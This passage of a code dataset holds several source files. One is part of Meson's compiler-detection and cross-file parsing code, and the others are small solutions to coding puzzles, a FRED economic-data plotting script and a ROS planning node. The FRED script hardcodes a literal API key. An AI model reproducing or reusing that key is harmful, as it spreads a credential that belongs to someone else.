intervention. In\n                # practice, Meson will block waiting for Watcom's cl.exe to\n                # exit, which requires user input and thus will never exit.\n                if 'WATCOM' in os.environ:\n                    def sanitize(p):\n                        return os.path.normcase(os.path.abspath(p))\n\n                    watcom_cls = [sanitize(os.path.join(os.environ['WATCOM'], 'BINNT', 'cl')),\n                                  sanitize(os.path.join(os.environ['WATCOM'], 'BINNT', 'cl.exe'))]\n                    found_cl = sanitize(shutil.which('cl'))\n                    if found_cl in watcom_cls:\n                        continue\n                arg = '/?'\n            elif 'armcc' in compiler[0]:\n                arg = '--vsn'\n            else:\n                arg = '--version'\n            try:\n                p, out, err = Popen_safe(compiler + [arg])\n            except OSError as e:\n                popen_exceptions[' '.join(compiler + [arg])] = e\n                continue\n            version = search_version(out)\n            full_version = out.split('\\n', 1)[0]\n\n            guess_gcc_or_lcc = False\n            if 'Free Software Foundation' in out:\n                guess_gcc_or_lcc = 'gcc'\n            if 'e2k' in out and 'lcc' in out:\n                guess_gcc_or_lcc = 'lcc'\n\n            if guess_gcc_or_lcc:\n                defines = self.get_gnu_compiler_defines(compiler)\n                if not defines:\n                    popen_exceptions[' '.join(compiler)] = 'no pre-processor defines'\n                    continue\n                gtype = self.get_gnu_compiler_type(defines)\n                if guess_gcc_or_lcc == 'lcc':\n                    version = self.get_lcc_version_from_defines(defines)\n                    cls = ElbrusCCompiler if lang == 'c' else ElbrusCPPCompiler\n                else:\n                    version = self.get_gnu_version_from_defines(defines)\n                    cls = GnuCCompiler if lang == 'c' else GnuCPPCompiler\n                return cls(ccache + compiler, version, gtype, is_cross, exe_wrap, defines, full_version=full_version)\n\n            if 'armclang' in out:\n                # The compiler version is not present in the first line of output,\n                # instead it is present in second line, startswith 'Component:'.\n                # So, searching for the 'Component' in out although we know it is\n                # present in second line, as we are not sure about the\n                # output format in future versions\n                arm_ver_str = re.search('.*Component.*', out)\n                if arm_ver_str is None:\n                    popen_exceptions[' '.join(compiler)] = 'version string not found'\n                    continue\n                arm_ver_str = arm_ver_str.group(0)\n                # Override previous values\n                version = search_version(arm_ver_str)\n                full_version = arm_ver_str\n                cls = ArmclangCCompiler if lang == 'c' else ArmclangCPPCompiler\n                return cls(ccache + compiler, version, is_cross, exe_wrap, full_version=full_version)\n            if 'clang' in out:\n                if 'Apple' in out or mesonlib.for_darwin(want_cross, self):\n                    cltype = CLANG_OSX\n                elif 'windows' in out or mesonlib.for_windows(want_cross, self):\n                    cltype = CLANG_WIN\n                else:\n                    cltype = CLANG_STANDARD\n                cls = ClangCCompiler if lang == 'c' else ClangCPPCompiler\n                return cls(ccache + compiler, version, cltype, is_cross, exe_wrap, full_version=full_version)\n            if 'Microsoft' in out or 'Microsoft' in err:\n                # Latest versions of Visual Studio print version\n                # number to stderr but earlier ones print version\n                # on stdout.  Why? Lord only knows.\n                # Check both outputs to figure out version.\n                version = search_version(err)\n                if version == 'unknown version':\n                    version = search_version(out)\n                if version == 'unknown version':\n                    m = 'Failed to detect MSVC compiler arch: stderr was\\n{!r}'\n                    raise EnvironmentException(m.format(err))\n                is_64 = err.split('\\n')[0].endswith(' x64')\n                cls = VisualStudioCCompiler if lang == 'c' else VisualStudioCPPCompiler\n                return cls(compiler, version, is_cross, exe_wrap, is_64)\n            if '(ICC)' in out:\n                # TODO: add microsoft add check OSX\n                inteltype = ICC_STANDARD\n                cls = IntelCCompiler if lang == 'c' else IntelCPPCompiler\n                return cls(ccache + compiler, version, inteltype, is_cross, exe_wrap, full_version=full_version)\n            if 'ARM' in out:\n                cls = ArmCCompiler if lang == 'c' else ArmCPPCompiler\n                return cls(ccache + compiler, version, is_cross, exe_wrap, full_version=full_version)\n        self._handle_exceptions(popen_exceptions, compilers)\n\n    def detect_c_compiler(self, want_cross):\n        return self._detect_c_or_cpp_compiler('c', 'CC', want_cross)\n\n    def detect_cpp_compiler(self, want_cross):\n        return self._detect_c_or_cpp_compiler('cpp', 'CXX', want_cross)\n\n    def detect_fortran_compiler(self, want_cross):\n        popen_exceptions = {}\n        compilers, ccache, is_cross, exe_wrap = self._get_compilers('fortran', 'FC', want_cross)\n        for compiler in compilers:\n            if isinstance(compiler, str):\n                compiler = [compiler]\n            for arg in ['--version', '-V']:\n                try:\n                    p, out, err = Popen_safe(compiler + [arg])\n                except OSError as e:\n                    popen_exceptions[' '.join(compiler + [arg])] = e\n                    continue\n\n                version = search_version(out)\n                full_version = out.split('\\n', 1)[0]\n\n                guess_gcc_or_lcc = False\n                if 'GNU Fortran' in out:\n                    guess_gcc_or_lcc = 'gcc'\n                if 'e2k' in out and 'lcc' in out:\n                    guess_gcc_or_lcc = 'lcc'\n\n                if guess_gcc_or_lcc:\n                    defines = self.get_gnu_compiler_defines(compiler)\n                    if not defines:\n                        popen_exceptions[' '.join(compiler)] = 'no pre-processor defines'\n                        continue\n                    gtype = self.get_gnu_compiler_type(defines)\n                    if guess_gcc_or_lcc == 'lcc':\n                        version = self.get_lcc_version_from_defines(defines)\n                        cls = ElbrusFortranCompiler\n                    else:\n                        version = self.get_gnu_version_from_defines(defines)\n                        cls = GnuFortranCompiler\n                    return cls(compiler, version, gtype, is_cross, exe_wrap, defines, full_version=full_version)\n\n                if 'G95' in out:\n                    return G95FortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n\n                if 'Sun Fortran' in err:\n                    version = search_version(err)\n                    return SunFortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n\n                if 'ifort (IFORT)' in out:\n                    return IntelFortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n\n                if 'PathScale EKOPath(tm)' in err:\n                    return PathScaleFortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n\n                if 'PGI Compilers' in out:\n                    return PGIFortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n\n                if 'Open64 Compiler Suite' in err:\n                    return Open64FortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n\n                if 'NAG Fortran' in err:\n                    return NAGFortranCompiler(compiler, version, is_cross, exe_wrap, full_version=full_version)\n        self._handle_exceptions(popen_exceptions, compilers)\n\n    def get_scratch_dir(self):\n        return self.scratch_dir\n\n    def detect_objc_compiler(self, want_cross):\n        popen_exceptions = {}\n        compilers, ccache, is_cross, exe_wrap = self._get_compilers('objc', 'OBJC', want_cross)\n        for compiler in compilers:\n            if isinstance(compiler, str):\n                compiler = [compiler]\n            arg = ['--version']\n            try:\n                p, out, err = Popen_safe(compiler + arg)\n            except OSError as e:\n                popen_exceptions[' '.join(compiler + arg)] = e\n                continue\n            version = search_version(out)\n            if 'Free Software Foundation' in out or ('e2k' in out and 'lcc' in out):\n                defines = self.get_gnu_compiler_defines(compiler)\n                if not defines:\n                    popen_exceptions[' '.join(compiler)] = 'no pre-processor defines'\n                    continue\n                gtype = self.get_gnu_compiler_type(defines)\n                version = self.get_gnu_version_from_defines(defines)\n                return GnuObjCCompiler(ccache + compiler, version, gtype, is_cross, exe_wrap, defines)\n            if out.startswith('Apple LLVM'):\n                return ClangObjCCompiler(ccache + compiler, version, CLANG_OSX, is_cross, exe_wrap)\n            if out.startswith('clang'):\n                return ClangObjCCompiler(ccache + compiler, version, CLANG_STANDARD, is_cross, exe_wrap)\n        self._handle_exceptions(popen_exceptions, compilers)\n\n    def detect_objcpp_compiler(self, want_cross):\n        popen_exceptions = {}\n        compilers, ccache, is_cross, exe_wrap = self._get_compilers('objcpp', 'OBJCXX', want_cross)\n        for compiler in compilers:\n            if isinstance(compiler, str):\n                compiler = [compiler]\n            arg = ['--version']\n            try:\n                p, out, err = Popen_safe(compiler + arg)\n            except OSError as e:\n                popen_exceptions[' '.join(compiler + arg)] = e\n                continue\n            version = search_version(out)\n            if 'Free Software Foundation' in out or ('e2k' in out and 'lcc' in out):\n                defines = self.get_gnu_compiler_defines(compiler)\n                if not defines:\n                    popen_exceptions[' '.join(compiler)] = 'no pre-processor defines'\n                    continue\n                gtype = self.get_gnu_compiler_type(defines)\n                version = self.get_gnu_version_from_defines(defines)\n                return GnuObjCPPCompiler(ccache + compiler, version, gtype, is_cross, exe_wrap, defines)\n            if out.startswith('Apple LLVM'):\n                return ClangObjCPPCompiler(ccache + compiler, version, CLANG_OSX, is_cross, exe_wrap)\n            if out.startswith('clang'):\n                return ClangObjCPPCompiler(ccache + compiler, version, CLANG_STANDARD, is_cross, exe_wrap)\n        self._handle_exceptions(popen_exceptions, compilers)\n\n    def detect_java_compiler(self):\n        exelist = ['javac']\n        try:\n            p, out, err = Popen_safe(exelist + ['-version'])\n        except OSError:\n            raise EnvironmentException('Could not execute Java compiler \"%s\"' % ' '.join(exelist))\n        version = search_version(err)\n        if 'javac' in out or 'javac' in err:\n            return JavaCompiler(exelist, version)\n        raise EnvironmentException('Unknown compiler \"' + ' '.join(exelist) + '\"')\n\n    def detect_cs_compiler(self):\n        compilers, ccache, is_cross, exe_wrap = self._get_compilers('cs', 'CSC', False)\n        popen_exceptions = {}\n        for comp in compilers:\n            if not isinstance(comp, list):\n                comp = [comp]\n            try:\n                p, out, err = Popen_safe(comp + ['--version'])\n            except OSError as e:\n                popen_exceptions[' '.join(comp + ['--version'])] = e\n                continue\n\n            version = search_version(out)\n            if 'Mono' in out:\n                return MonoCompiler(comp, version)\n            elif \"Visual C#\" in out:\n                return VisualStudioCsCompiler(comp, version)\n\n        self._handle_exceptions(popen_exceptions, compilers)\n\n    def detect_vala_compiler(self):\n        if 'VALAC' in os.environ:\n            exelist = shlex.split(os.environ['VALAC'])\n        else:\n            exelist = ['valac']\n        try:\n            p, out = Popen_safe(exelist + ['--version'])[0:2]\n        except OSError:\n            raise EnvironmentException('Could not execute Vala compiler \"%s\"' % ' '.join(exelist))\n        version = search_version(out)\n        if 'Vala' in out:\n            return ValaCompiler(exelist, version)\n        raise EnvironmentException('Unknown compiler \"' + ' '.join(exelist) + '\"')\n\n    def detect_rust_compiler(self, want_cross):\n        popen_exceptions = {}\n        compilers, ccache, is_cross, exe_wrap = self._get_compilers('rust', 'RUSTC', want_cross)\n        for compiler in compilers:\n            if isinstance(compiler, str):\n                compiler = [compiler]\n            arg = ['--version']\n            try:\n                p, out = Popen_safe(compiler + arg)[0:2]\n            except OSError as e:\n                popen_exceptions[' '.join(compiler + arg)] = e\n                continue\n\n            version = search_version(out)\n\n            if 'rustc' in out:\n                return RustCompiler(compiler, version, is_cross, exe_wrap)\n\n        self._handle_exceptions(popen_exceptions, compilers)\n\n    def detect_d_compiler(self, want_cross):\n        is_cross = False\n        # Search for a D compiler.\n        # We prefer LDC over GDC unless overridden with the DC\n        # environment variable because LDC has a much more\n        # up to date language version at time (2016).\n        if 'DC' in os.environ:\n            exelist = shlex.split(os.environ['DC'])\n        elif self.is_cross_build() and want_cross:\n            exelist = mesonlib.stringlistify(self.cross_info.config['binaries']['d'])\n            is_cross = True\n        elif shutil.which(\"ldc2\"):\n            exelist = ['ldc2']\n        elif shutil.which(\"ldc\"):\n            exelist = ['ldc']\n        elif shutil.which(\"gdc\"):\n            exelist = ['gdc']\n        elif shutil.which(\"dmd\"):\n            exelist = ['dmd']\n        else:\n            raise EnvironmentException('Could not find any supported D compiler.')\n\n        try:\n            p, out = Popen_safe(exelist + ['--version'])[0:2]\n        except OSError:\n            raise EnvironmentException('Could not execute D compiler \"%s\"' % ' '.join(exelist))\n        version = search_version(out)\n        full_version = out.split('\\n', 1)[0]\n        if 'LLVM D compiler' in out:\n            return compilers.LLVMDCompiler(exelist, version, is_cross, full_version=full_version)\n        elif 'gdc' in out:\n            return compilers.GnuDCompiler(exelist, version, is_cross, full_version=full_version)\n        elif 'The D Language Foundation' in out or 'Digital Mars' in out:\n            return compilers.DmdDCompiler(exelist, version, is_cross, full_version=full_version)\n        raise EnvironmentException('Unknown compiler \"' + ' '.join(exelist) + '\"')\n\n    def detect_swift_compiler(self):\n        exelist = ['swiftc']\n        try:\n            p, _, err = Popen_safe(exelist + ['-v'])\n        except OSError:\n            raise EnvironmentException('Could not execute Swift compiler \"%s\"' % ' '.join(exelist))\n        version = search_version(err)\n        if 'Swift' in err:\n            return compilers.SwiftCompiler(exelist, version)\n        raise EnvironmentException('Unknown compiler \"' + ' '.join(exelist) + '\"')\n\n    def detect_static_linker(self, compiler):\n        if compiler.is_cross:\n            linker = self.cross_info.config['binaries']['ar']\n            if isinstance(linker, str):\n                linker = [linker]\n            linkers = [linker]\n        else:\n            evar = 'AR'\n            if evar in os.environ:\n                linkers = [shlex.split(os.environ[evar])]\n            elif isinstance(compiler, compilers.VisualStudioCCompiler):\n                linkers = [self.vs_static_linker]\n            elif isinstance(compiler, compilers.GnuCompiler):\n                # Use gcc-ar if available; needed for LTO\n                linkers = [self.gcc_static_linker, self.default_static_linker]\n            elif isinstance(compiler, compilers.ClangCompiler):\n                # Use llvm-ar if available; needed for LTO\n                linkers = [self.clang_static_linker, self.default_static_linker]\n            else:\n                linkers = [self.default_static_linker]\n        popen_exceptions = {}\n        for linker in linkers:\n            if 'lib' in linker or 'lib.exe' in linker:\n                arg = '/?'\n            else:\n                arg = '--version'\n            try:\n                p, out, err = Popen_safe(linker + [arg])\n            except OSError as e:\n                popen_exceptions[' '.join(linker + [arg])] = e\n                continue\n            if '/OUT:' in out or '/OUT:' in err:\n                return VisualStudioLinker(linker)\n            if p.returncode == 0:\n                return ArLinker(linker)\n            if p.returncode == 1 and err.startswith('usage'): # OSX\n                return ArLinker(linker)\n        self._handle_exceptions(popen_exceptions, linkers, 'linker')\n        raise EnvironmentException('Unknown static linker \"%s\"' % ' '.join(linkers))\n\n    def detect_ccache(self):\n        try:\n            has_ccache = subprocess.call(['ccache', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        except OSError:\n            has_ccache = 1\n        if has_ccache == 0:\n            cmdlist = ['ccache']\n        else:\n            cmdlist = []\n        return cmdlist\n\n    def get_source_dir(self):\n        return self.source_dir\n\n    def get_build_dir(self):\n        return self.build_dir\n\n    def get_exe_suffix(self):\n        return self.exe_suffix\n\n    def get_import_lib_dir(self):\n        \"Install dir for the import library (library used for linking)\"\n        return self.get_libdir()\n\n    def get_shared_module_dir(self):\n        \"Install dir for shared modules that are loaded at runtime\"\n        return self.get_libdir()\n\n    def get_shared_lib_dir(self):\n        \"Install dir for the shared library\"\n        if self.win_libdir_layout:\n            return self.get_bindir()\n        return self.get_libdir()\n\n    def get_static_lib_dir(self):\n        \"Install dir for the static library\"\n        return self.get_libdir()\n\n    def get_object_suffix(self):\n        return self.object_suffix\n\n    def get_prefix(self):\n        return self.coredata.get_builtin_option('prefix')\n\n    def get_libdir(self):\n        return self.coredata.get_builtin_option('libdir')\n\n    def get_libexecdir(self):\n        return self.coredata.get_builtin_option('libexecdir')\n\n    def get_bindir(self):\n        return self.coredata.get_builtin_option('bindir')\n\n    def get_includedir(self):\n        return self.coredata.get_builtin_option('includedir')\n\n    def get_mandir(self):\n        return self.coredata.get_builtin_option('mandir')\n\n    def get_datadir(self):\n        return self.coredata.get_builtin_option('datadir')\n\n    def get_compiler_system_dirs(self):\n        for comp in self.coredata.compilers.values():\n            if isinstance(comp, compilers.ClangCompiler):\n                index = 1\n                break\n            elif isinstance(comp, compilers.GnuCompiler):\n                index = 2\n                break\n        else:\n            # This option is only supported by gcc and clang. If we don't get a\n            # GCC or Clang compiler return and empty list.\n            return []\n\n        p, out, _ = Popen_safe(comp.get_exelist() + ['-print-search-dirs'])\n        if p.returncode != 0:\n            raise mesonlib.MesonException('Could not calculate system search dirs')\n        out = out.split('\\n')[index].lstrip('libraries: =').split(':')\n        return [os.path.normpath(p) for p in out]\n\nclass CrossBuildInfo:\n    def __init__(self, filename):\n        self.config = {'properties': {}}\n        self.parse_datafile(filename)\n        if 'target_machine' in self.config:\n            return\n        if 'host_machine' not in self.config:\n            raise mesonlib.MesonException('Cross info file must have either host or a target machine.')\n        if 'binaries' not in self.config:\n            raise mesonlib.MesonException('Cross file is missing \"binaries\".')\n\n    def ok_type(self, i):\n        return isinstance(i, (str, int, bool))\n\n    def parse_datafile(self, filename):\n        config = configparser.ConfigParser()\n        try:\n            with open(filename, 'r') as f:\n                config.read_file(f, filename)\n        except FileNotFoundError:\n            raise EnvironmentException('File not found: %s.' % filename)\n        # This is a bit hackish at the moment.\n        for s in config.sections():\n            self.config[s] = {}\n            for entry in config[s]:\n                value = config[s][entry]\n                if ' ' in entry or '\\t' in entry or \"'\" in entry or '\"' in entry:\n                    raise EnvironmentException('Malformed variable name %s in cross file..' % entry)\n                try:\n                    res = eval(value, {'__builtins__': None}, {'true': True, 'false': False})\n                except Exception:\n                    raise EnvironmentException('Malformed value in cross file variable %s.' % entry)\n\n                if entry == 'cpu_family' and res not in known_cpu_families:\n                    mlog.warning('Unknown CPU family %s, please report this at https://github.com/mesonbuild/meson/issues/new' % value)\n\n                if self.ok_type(res):\n                    self.config[s][entry] = res\n                elif isinstance(res, list):\n                    for i in res:\n                        if not self.ok_type(i):\n                            raise EnvironmentException('Malformed value in cross file variable %s.' % entry)\n                    self.config[s][entry] = res\n                else:\n                    raise EnvironmentException('Malformed value in cross file variable %s.' % entry)\n\n    def has_host(self):\n        return 'host_machine' in self.config\n\n    def has_target(self):\n        return 'target_machine' in self.config\n\n    def has_stdlib(self, language):\n        return language + '_stdlib' in self.config['properties']\n\n    def get_stdlib(self, language):\n        return self.config['properties'][language + '_stdlib']\n\n    def get_properties(self):\n        return self.config['properties']\n\n    def get_root(self):\n        return self.get_properties().get('root', None)\n\n    def get_sys_root(self):\n        return self.get_properties().get('sys_root', None)\n\n    # When compiling a cross compiler we use the native compiler for everything.\n    # But not when cross compiling a cross compiler.\n    def need_cross_compiler(self):\n        return 'host_machine' in self.config\n\n    def need_exe_wrapper(self):\n        value = self.config['properties'].get('needs_exe_wrapper', None)\n        if value is not None:\n            return value\n        # Can almost always run 32-bit binaries on 64-bit natively if the host\n        # and build systems are the same. We don't pass any compilers to\n        # detect_cpu_family() here because we always want to know the OS\n        # architecture, not what the compiler environment tells us.\n        if self.has_host() and detect_cpu_family({}) == 'x86_64' and \\\n           self.config['host_machine']['cpu_family'] == 'x86' and \\\n           self.config['host_machine']['system'] == detect_system():\n            return False\n        return True\n\n\nclass MachineInfo:\n    def __init__(self, system, cpu_family, cpu, endian):\n        self.system = system\n        self.cpu_family = cpu_family\n        self.cpu = cpu\n        self.endian = endian\n"}
{"blob_id": "f6a338029a06de44183a06ae6ccd86ac8f730f73", "directory_id": "5578cc2ed8347a1cd408abbb6a1a6e829e84575b", "path": "/Interview Prep Kit/Warm-Up Challenges/Repeated String", "content_id": "91d3b6f146582daf57a99c4dbd27e7463321bd6f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mbrak0/HackerRank-Solutions", "snapshot_id": "0e38665333c6b72ba4138d8cce7bd0ef797ac893", "revision_id": "700e5a32d45edb61259ad794056fb24d1a6a9bfc", "branch_name": "refs/heads/main", "visit_date": "2023-03-07 10:09:02.400707", "revision_date": "2021-02-09 19:33:11", "committer_date": "2021-02-09 19:33:11", "github_id": "323472687", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "748", "extension": "", "content": "#!/bin/python3\n\nimport math\nimport os\nimport random\nimport re\nimport sys\n\n# Complete the repeatedString function below.\ndef repeatedString(s, n):\n    \n    a_num = 0\n    a_extra = 0\n    \n    for i in range (0,len(s)):\n        if s[i] == \"a\":\n            a_num += 1\n    \n    comp_s = n // len(s)\n    \n    if (n % len(s)) != 0:\n    \n        incomp_s = n % len(s)\n        \n        for j in range (0,incomp_s):\n            if s[j] == \"a\":\n                a_extra += 1\n    \n    a_total = a_num * comp_s + a_extra\n    \n    return(a_total)   \n    \n    \nif __name__ == '__main__':\n    fptr = open(os.environ['OUTPUT_PATH'], 'w')\n\n    s = input()\n\n    n = int(input())\n\n    result = repeatedString(s, n)\n\n    fptr.write(str(result) + '\\n')\n\n    fptr.close()\n"}
{"blob_id": "db948e736883ba6fdada7f297466735b5062f104", "directory_id": "faa0fda10355ebe1a2caf497b2c1b05ef3234fd5", "path": "/Code/Python/slides_indicators_FRED.py", "content_id": "6f2a4dcf4e1f7f1a32e17c12cefd76da556755ac", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "DaveBackus/Global_Economy", "snapshot_id": "c41f01e0a3298d980bb2f4b10775d9aa66c3f9f9", "revision_id": "e1cc2f546edc5bed87999aeefcd5ec9066ebb912", "branch_name": "refs/heads/master", "visit_date": "2021-01-15 23:50:19.528868", "revision_date": "2016-03-07 17:22:47", "committer_date": "2016-03-07 17:22:47", "github_id": "22357773", "star_events_count": "4", "fork_events_count": "12", "gha_license_id": "None", "gha_event_created_at": "2015-07-29 22:10:17", "gha_created_at": "2014-07-28 21:00:16", "gha_language": "TeX", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2925", "extension": "py", "content": "\"\"\"\nslides_indicators_fred.py\nGlobal Economy course, handles the following:\n* Loads data from FRED (uses the fred python module)\n* cross-correlation function and graph\n* business cycle scorecard (more graphs)\n\nWritten by: Trevor Barnett (tsb296@stern.nyu.edu, November 2013)\nAdapted from 'slides_indicators_FRED.R', written by Paul Backus and Espen \nHenriksen.  \n\nUSAGE: Just run the script. If 'DISPLAY' below is set to True, the script will \ndisplay the graphs, rather than output them to the current working directory. \nThis uses the API key provided by Kim Ruhl in the original R script. Make sure \nyou have the scipy suite and pandas suite installed, as well as the 'fred' \npackage (available in PyPy repository). \n\nAs of now, this doesn't run on Python 3.4.\n\"\"\"\nimport fred\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom datetime import date, datetime\n\nFRED_API_KEY=\"055ba538c874e5974ee22d786f27fdda\"\nFRED_SERIES=[\"INDPRO\", \"PAYEMS\", \"HOUST\", \"RRSFS\", \"NAPM\"]\nFRED_START=date(1990,1,1)\n\n#set to false to output graphs to a file, uses current working directory. \n# All numerical analysis is printed to the console\nDISPLAY=False\n\nfred.key(FRED_API_KEY)\n\ndef get_fred_series(series):\n\tdef filter(o):\n\t\treturn {'date': datetime.strptime(o['date'],'%Y-%m-%d').date(),\n\t\t\t    series: o['value']}\n\n\treturn pd.DataFrame(map(filter,fred.observations(series)['observations']),\n                         dtype='float64').set_index('date').dropna()\n\n\nfred_data=get_fred_series(FRED_SERIES[0]) # Build an initial DataFrame\nfor s in FRED_SERIES[1:]:\n\tfred_data=fred_data.join(get_fred_series(s))\n\nfred_data=np.log(fred_data).diff(12)[FRED_START:].dropna()\n\ndef make_ccf_chart(ax,x,y,title):\n\tax.xcorr(fred_data[x],fred_data[y],maxlags=24)\n\tax.set_ylim(-1,1)\n\tax.set_xlim(-24,24)\n\tax.set_xlabel(\"Lag k relative to IP\",fontsize=8)\n\tax.set_title(title,fontsize=12)\n\tax.axvline(ymin=-1,ymax=1,color='r')\n\nplt.close('all')\nfig,((ax1,ax2),(ax3,ax4))=plt.subplots(nrows=2,ncols=2)\nmake_ccf_chart(ax1,'PAYEMS','INDPRO','Nonfarm Eployment')\nmake_ccf_chart(ax2,'HOUST','INDPRO','Housing Starts')\nmake_ccf_chart(ax3,'RRSFS','INDPRO','Retail Sales')\nmake_ccf_chart(ax4,'NAPM','INDPRO','Purchasing Managers Index')\n\nplt.tight_layout()\n\nif DISPLAY:\n\tplt.show()\nelse:\n\tplt.savefig('ccf.png')\n\nmean = fred_data.mean()\nstd  = fred_data.std()\ncorr = fred_data.corr()\nprint(\" == MEAN ==\") \nprint(mean) \nprint(\" == STD. DEV. ==\") \nprint(std) \nprint(\" == CORR ==\") \nprint(corr) \n\n#%%\n\n\ndef make_bcs_chart(ax,n,title):\n\tax.plot(fred_data.index,fred_data[n])\n\tax.set_title(title)\n\txlim,ylim=ax.get_xlim(),ax.get_ylim()\n\t\n\t\n\tax.fill_between(xlim,mean[n]+std[n],mean[n]-std[n],facecolor='yellow',alpha=0.5)\n\t\n\t\nplt.close('all')\nfig,(ax1,ax2)=plt.subplots(nrows=2,ncols=1)\nmake_bcs_chart(ax1,'INDPRO','Industrial Production')\nmake_bcs_chart(ax2,'PAYEMS','Nonfarm Employment')\n\nif DISPLAY:\n\tplt.show()\nelse:\n\tplt.savefig('bcs.png')\n"}
{"blob_id": "8010f9e269a212791cd773dc33e8beef2e9febed", "directory_id": "e801d436888303d77a7bd909b1766fe031e23533", "path": "/try_distributeCandies.py", "content_id": "5b0020ded9bb1a09cbe7d807c814267833bac96e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kingkoma/Coderbyte-LintCode-LeetCode", "snapshot_id": "e5cf3b487eca4db81961bc586e13984c4aa74e56", "revision_id": "31e262b30b2b02da3203942e3bbc24fea6cefb0e", "branch_name": "refs/heads/master", "visit_date": "2021-05-13 17:33:09.267286", "revision_date": "2018-03-24 13:23:30", "committer_date": "2018-03-24 13:23:30", "github_id": "116825885", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1463", "extension": "py", "content": "'''\nGiven an integer array with even length, where different numbers in this array represent different kinds of candies. Each number means one candy of the corresponding kind. You need to distribute these candies equally in number to brother and sister. Return the maximum number of kinds of candies the sister could gain.\nExample 1:\nInput: candies = [1,1,2,2,3,3]\nOutput: 3\nExplanation:\nThere are three different kinds of candies (1, 2 and 3), and two candies for each kind.\nOptimal distribution: The sister has candies [1,2,3] and the brother has candies [1,2,3], too. \nThe sister has three different kinds of candies. \nExample 2:\nInput: candies = [1,1,2,3]\nOutput: 2\nExplanation: For example, the sister has candies [2,3] and the brother has candies [1,1]. \nThe sister has two different kinds of candies, the brother has only one kind of candies. \nNote:\n\nThe length of the given array is in range [2, 10,000], and will be even.\nThe number in given array is in range [-100,000, 100,000].\n'''\nclass Solution:\n    def distributeCandies(self, candies):\n        \"\"\"\n        :type candies: List[int]\n        :rtype: int\n        \"\"\"\n        each_num = int(len(candies)/2)\n        unique_candies = set(candies)\n        kind_candies = len(unique_candies)\n        if kind_candies >= each_num:\n            res = each_num\n        elif kind_candies < each_num:\n            res = kind_candies\n        return res\n\n        # return int(min(len(candies)/2, len(set(candies))))\n"}
{"blob_id": "bb96ba6c34c163953625843e1d4741659bbadd04", "directory_id": "2d48cc1b063fc498314f27c314ca3775c8508236", "path": "/src/amswmr/scripts/__pycache__/planningActions.py", "content_id": "e307277f2c9dba1d94d4f14ddde3826a835736b6", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "bk8200/AMS_oddaja", "snapshot_id": "f44fa8c1d2f1e843ce1c5ec306b21e85cf48e8f8", "revision_id": "e94b80e72cc50e178d677d080fc0dee7f588778b", "branch_name": "refs/heads/master", "visit_date": "2020-12-06 01:14:11.179947", "revision_date": "2020-01-10 13:07:38", "committer_date": "2020-01-10 13:07:38", "github_id": "232297234", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2192", "extension": "py", "content": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\nimport rospy\nfrom std_msgs.msg import String\nfrom PathPlanning import PathPlanning\nfrom itertools import tee\n\n'''\n# Implement the following method in PathPlanning class: \n  def generateActions(self, path):\n    actions = [] # A list of lists: [string(action), float(segmentLength), int(nextNodeID)]\n    return actions\n'''\n\n'''\n# To subscribe to actions in Wmrros class, add to the constructor:\n    self._subActions = rospy.Subscriber('path_actions', String, self._handleActions)\n# and implement the following function inside Wmrros class:\n  def _handleActions(self, msg):\n    print(msg.data)\n    a = msg.data.split(';')\n    if len(a):\n      b = [x.split(',') for x in a]\n      actions = [(x[0], float(x[1]), int(x[2])) for x in b if len(x) > 2]\n'''\n\nclass Planning(object):\n  def __init__(self):\n    self._pp = PathPlanning()\n    # Subscriber to the start and goal tag ID (the two values are separated by a comma).\n    self._subStartGoal = rospy.Subscriber('start_goal_tag', String, self._handleStartGoal)\n    # Publisher of the path, which is given as a list of comma separated tag IDs.\n    self._pubPathTags = rospy.Publisher('path_tags', String, queue_size=10, latch=True)\n    # Publisher of the actions, which are given as a semicolon separated list of actions.\n    self._pubPathActions = rospy.Publisher('path_actions', String, queue_size=10, latch=True)\n\n  def _handleStartGoal(self, msg):\n    try:\n      startGoal = msg.data.split(',')\n      \n      path = self._pp.findPath(int(startGoal[0]), int(startGoal[1]))\n      patha, pathb = tee(path)\n      \n      msgPathTags = String()\n      msgPathTags.data = ','.join(str(x) for x in patha)\n      if msgPathTags.data != '':\n        self._pubPathTags.publish(msgPathTags)\n      \n      actions = self._pp.generateActions(list(pathb))\n      msgPathActions = String()\n      msgPathActions.data = ';'.join('{:s},{:f},{:d}'.format(*x) for x in actions)\n      if msgPathActions.data != '':\n        self._pubPathActions.publish(msgPathActions)\n    except AttributeError:\n      print('Error! Something went wrong :(')\n\nif __name__ == '__main__':\n  rospy.init_node('planning')\n  p = Planning()\n  rospy.spin()\n"}
